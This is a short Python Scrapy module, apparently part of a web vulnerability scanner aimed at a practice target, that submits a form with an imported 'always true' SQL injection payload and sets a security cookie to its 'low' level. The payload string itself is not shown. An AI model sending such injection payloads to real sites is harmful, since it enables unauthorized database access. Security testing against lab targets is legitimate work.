import scrapy
from constants import SQL_ALWAYS_TRUE_PAYLOAD, SECURITY_COOKIE_KEY, \
    SECURITY_COOKIE_LOW_VALUE, FORM_ID_KEY


class Sql:

    def post_data(self, response):
        form_data = {
            FORM_ID_KEY: SQL_ALWAYS_TRUE_PAYLOAD
        }
        return scrapy.FormRequest.from_response(response,
                                                cookies={
                                                    SECURITY_COOKIE_KEY: SECURITY_COOKIE_LOW_VALUE}
                                                ,
                                                formid=FORM_ID_KEY,
                                                formdata=form_data)
